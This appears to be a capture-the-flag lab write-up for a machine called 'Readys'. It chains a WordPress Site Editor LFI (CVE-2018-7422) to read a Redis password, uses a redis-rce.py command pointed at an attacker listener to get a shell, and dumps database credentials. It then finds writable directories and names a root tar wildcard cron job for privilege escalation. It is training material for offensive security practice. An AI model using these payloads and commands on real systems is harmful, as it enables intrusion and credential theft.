# Readys \[Inter]

## Report

'site-editor' plugin for WordPress is vulnerable to LFI, use it read config file of Redis service which exposes auth password for Redis, use Redis RCE exploit to get shell as user 'redis'. We find another user 'alice' exists but nothing noteworthy from linpeas and pspy. The WordPress website however is owned by 'alice' and trey to get a reverse shell via the website, the html directory is not writable by us.&#x20;

The LFI exploit however bypasses that requirement, write PHP reverse shell to a writable directory and execute it via exploit (/run/redis) to become user alice. Root is running a tar cronjob which is exploited via wildcards.

```bash
find / -type d -maxdepth 5 -writable 2>/dev/null
```

## Enumeration

192.168.112.166

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: HEAD OPTIONS
|_http-generator: WordPress 5.7.2
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
```

#### 80 (WordPress)

```
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 61ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 65ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 61ms]


wpscan --rua -e --url http://192.168.112.166/

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)

[+] XML-RPC seems to be enabled: http://192.168.112.166/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
[+] WordPress readme found: http://192.168.112.166/readme.html
 | Found By: Direct Access (Aggressive Detection)
[+] Upload directory has listing enabled: http://192.168.112.166/wp-content/uploads/
[+] The external WP-Cron seems to be enabled: http://192.168.112.166/wp-cron.php
[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.112.166/wp-content/themes/twentytwentyone/
   The version is out of date, the latest version is 2.6 (1.3)
[i] User(s) Identified:
[+] admin

xmlrpc.php seems to be for bruteforcing auth
wp-traceback shows a goofy error asking for ID
cannot register a new user
```

Initial scan did not identify the plugin

{% code overflow="wrap" %}
```
sudo wpscan --url http://192.168.112.166
[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.112.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

#### 6379 (Redis)

Need auth, then we can slap a revshell

```
redis-cli -h 192.168.112.166
CONFIG GET *
(error) NOAUTH Authentication required.
```

## Loot

### Attack Vectors

CVE-2018-7422: Site Editor Wordpress Plugin LFI

```
http://192.168.112.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

/etc/apache2/sites-enabled/000-default.conf
Document root : DocumentRoot /var/www/html
/etc/redis/redis.conf
#requirepass Ready4Redis?
SIKE NO # THAT"S THE PASS

Run redis-rce.py
python3 redis-rce.py -L 192.168.45.181 -r 192.168.112.166 -f module.so -a 'Ready4Redis?'
```

### PrivEsc

#### redis->alice

{% code title="var/www/html/wp-config.php" %}
```
/** MySQL database username */
define( 'DB_USER', 'karl' );
/** MySQL database password */
define( 'DB_PASSWORD', 'Wordpress1234' );

MariaDB [wordpress]> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0 |
+------------+------------------------------------+
No crack
```
{% endcode %}

Website is owned by alice, if we can get reverse shell from WordPress we become alice, also we have the LFI exploit from our plugin already but user 'redis' can't write to html directory.

SO find where we can write

```
find / -type d -maxdepth 5 -writable 2>/dev/null

/tmp
/proc/21716/task/21716/fd
/proc/21716/fd
/proc/21716/map_files
/run/redis
/opt/redis-files
/var/tmp
/var/lib/redis
/var/lib/redis/.local
/var/log/redis
```

Let fly, one will hit eventualy '/run/redis' and you become alice

#### alice->root

```
*/3 * * * * root /usr/local/bin/backup.sh
alice@readys:/var/www/html$ cat /usr/local/bin/backup.sh
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
```

### Creds

None

### Proof

First reading redis.conf from Wordpress was cold, fumbling the second Wordpress revshell was goofy tho
